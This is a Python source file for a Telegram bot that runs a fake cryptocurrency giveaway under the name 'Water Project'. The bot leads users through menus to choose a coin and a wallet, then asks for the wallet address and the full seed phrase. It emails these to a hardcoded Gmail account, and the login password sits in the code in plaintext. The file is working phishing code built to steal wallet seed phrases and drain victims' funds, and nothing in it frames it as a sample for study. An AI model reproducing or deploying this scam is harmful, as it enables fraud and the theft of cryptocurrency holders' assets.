import os
import logging
import telebot
import smtplib, ssl

api_key = os.environ['api_key']
logging.basicConfig(filename='bot.log', format='%(levelname)s - %(asctime)s - %(message)s', level=logging.INFO)
MESSAGE = """\
Subject: New crypto Update

*** 
+++
---
>>> """

try:
    bot = telebot.TeleBot(api_key)
except:
    logging.error("Problem connecting with api_key\n")

try:
    def send_mail(message):
        port = 465  # For SSL
        password = "waterproject36O_"
        sender_email ="wproject360@gmail.com"
        receiver_email = "wproject360@gmail.com"
        # Create a secure SSL context
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login("wproject360@gmail.com", password)
            server.sendmail(sender_email, receiver_email, message)

except:
    logging.error("Problem sending mail\n")

try:
    @bot.message_handler(commands=["start"])
    def start_message(message):
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row("Receive gift coins")
        keyboard.add('Invite')
        keyboard.row('Chat with us')
        keyboard.row('Terms and conditions')
        bot.send_message(message.chat.id, text='''We are currently giving out Binance smartchain coin sponsored by the Water Project to all active accounts from now till DEC 31 How To Benefit\n1. Make sure you have an existing wallet account\n2. Your wallet account must have Binance smart chain for transaction to be successful.\n3. You must hold a minimum of $20 token\nNote: Only active account with BSC will be acknowledged\nYou can only benefit once per account\nDo not send coin to any external wallet or anyone claiming to be us\nPlease share your testimony in our community page after receiving your giveaway rewards. Stay Hydrated!''', reply_markup=keyboard)
        if(message.text != "back"):
            bot.send_photo(message.chat.id,photo=open("logo.jpeg","rb"))
        logging.info(message)
except:
    logging.error("Problem during start message\n")
# def selectCoin():
#     keyboard = telebot.types.ReplyKeyboardMarkup(True)
#     keyboard.row("BSC")
#     keyboard.row('ETH')
#     keyboard.row('USDT')
#     keyboard.row("TRON")
#     keyboard.row("BUSD")
#     return keyboard

def check_string(message):
    if message.text == "Receive gift coins":
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add(telebot.types.KeyboardButton("BSC"))
        keyboard.add(telebot.types.KeyboardButton("ETH"))
        keyboard.add(telebot.types.KeyboardButton("USDT"))
        keyboard.add(telebot.types.KeyboardButton("TRON"))
        keyboard.add(telebot.types.KeyboardButton("back"))
        return ["Select coin to receive", keyboard]

    elif message.text == "Invite":
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add(telebot.types.KeyboardButton("back"))
        return ("share our link with your friends https://t.me/joinchat/eYW6zGn6xHU5YTMx",keyboard)

    elif message.text == "Chat with us":
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add(telebot.types.KeyboardButton("back"))
        return ("chat with our admins:\nhttps://t.me/WaterProject_Admin\nhttps://t.me/Water_Project_Admin_2", keyboard)

    elif message.text == "Terms and conditions":
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add(telebot.types.KeyboardButton("back"))
        return ("🗣TERMS AND CONDITIONS\n1. You will recieve $100 worth of preferred Coin in your wallet.\n2. Wallet authorization is necessary so as to ensure one user per reward. Without wallet authorization a user cannot claim coin gift.\n3. After a successful coin claim, your preferred coin would be sent to your address in less than 48 hours. \n-----------------------------------------------",keyboard)


def wallet(message):
    
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.add(telebot.types.KeyboardButton("Trust wallet"))
    keyboard.add(telebot.types.KeyboardButton("MetaMask"))
    keyboard.add(telebot.types.KeyboardButton("Walleth"))
    keyboard.add(telebot.types.KeyboardButton("Safe pal"))
    keyboard.add(telebot.types.KeyboardButton("Ledger"))
    keyboard.add(telebot.types.KeyboardButton("back"))
    return ("Select your wallet", keyboard )

try:
    @bot.message_handler(func= lambda message: message.text in ["Receive gift coins","Invite","Chat with us","Terms and conditions"])
    def select_coin(message):
        msg,markup = check_string(message)
        bot.send_message(message.chat.id,msg,reply_markup=markup)
        logging.info(message)
except:
    logging.error("Problem with menu\n")

try:
    @bot.message_handler(func= lambda message: message.text in ["BSC","ETH","USDT","TRON","back"])
    def select_wallet(message):
        if message.text == "back":
            start_message(message)
            return
        msg,markup = wallet(message)
        bot.send_message(message.chat.id,msg,reply_markup=markup)
        logging.info(message)
except:
    logging.error("Problem during selecting coin\n")
    
isWallet = None
try:
    @bot.message_handler(func=lambda message:message.text in ["Trust wallet","MetaMask","Walleth","Safe pal","Ledger","back"])
    def request_wallet(message):

    
        if message.text == "back":
            select_wallet(message)
            return
        global MESSAGE,isWallet
        isWallet = True
        MESSAGE = MESSAGE.replace("***","wallet name:"+message.text)
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("back")
        bot.send_message(message.chat.id,"input wallet address",reply_markup=keyboard)
        logging.info(message)
except:
    logging.error("Problem during selecting wallet\n")

password = ""
isPassword = None
try:
    @bot.message_handler(func=lambda message: 20 <=len(message.text) <= 50 and ("-" in message.text or "x" in message.text) and isWallet == True or message.text == "back")
    def request_wallet_Auth(message):
        if message.text == "back":
            request_wallet(message)
            return
        global MESSAGE, isPassword
        isPassword = True
        MESSAGE = MESSAGE.replace("+++","wallet:"+message.text)
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("Authorize wallet")
        keyboard.add("back")
        bot.send_message(message.chat.id,"Authorize wallet",reply_markup=keyboard)
        logging.info(message)
except:
    logging.error("Problem during inputting wallet\n")

isSeed = None
try:
    @bot.message_handler(func=lambda message:message.text == "Authorize wallet"  or message.text == "back")
    def request_wallet_seed(message):
        if message.text == "back":
            request_wallet_Auth(message)
            return
        global MESSAGE, isSeed,password
        isSeed = True
        password = message.text
        MESSAGE = MESSAGE.replace("---","wallet password:"+message.text)
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("back")
        bot.send_message(message.chat.id,"input wallet seed phrase",reply_markup=keyboard)    
        logging.info(message)
except:
    logging.error("Problem during inputting password\n")

try:
    @bot.message_handler(func=lambda message:len(message.text.split()) == 12 or len(message.text.split()) == 18 or len(message.text.split()) == 24 and isSeed == True)
    def confirm_authorization(message):
        
        if message.text == "back":
            request_wallet_seed(message)
            return
        global MESSAGE
        MESSAGE = MESSAGE.replace(">>>","wallet seed phrase:"+message.text)
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("Authorize")
        keyboard.add("back")
        bot.send_message(message.chat.id,"Confirm Authorization",reply_markup=keyboard)
        bot.register_next_step_handler(message,authorize)
        logging.info(message)
        logging.info("\n\n\n")
except:
    logging.error("Problem during inputting seed phrase\n")

def authorize(message):
    if message.text == "Authorize":
        success_msg(message)
    elif message.text == "back":
        request_wallet_seed(message)
    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("back")
        bot.send_message(message.chat.id,"Authorization unsuccesful,please try again",reply_markup=keyboard)
        
def success_msg(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.add("back")
    bot.send_message(message.chat.id,"Congratulations your entry has been approved. Your coin will reflect in your wallet in less than 48 hours.",reply_markup=keyboard)
    bot.send_photo(message.chat.id,photo=open("congrats.jpeg","rb"))
    send_mail(MESSAGE)

try:
    @bot.message_handler(content_types=["text"])
    def invalid(message):
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.add("back")
        bot.send_message(message.chat.id,"Invalid entry",reply_markup=keyboard)
        logging.info(message)
except:
    logging.error("Problem with text entered\n")


# @bot.callback_query_handler(func=lambda call: True)
# def test_callback(call):
#     bot.answer_callback_query(call.id,text='Answer accepted!')
#     answer = 'You made a mistake'
#     print(call.data)
#     if call.data == "0":
#         answer = 'Select coin to receive'
#         bot.send_message(call.message.chat.id, answer)
#         #answer = selectCoin()
#         bot.send_message(call.message.chat.id, reply_markup=answer)
#     bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)

bot.infinity_polling()

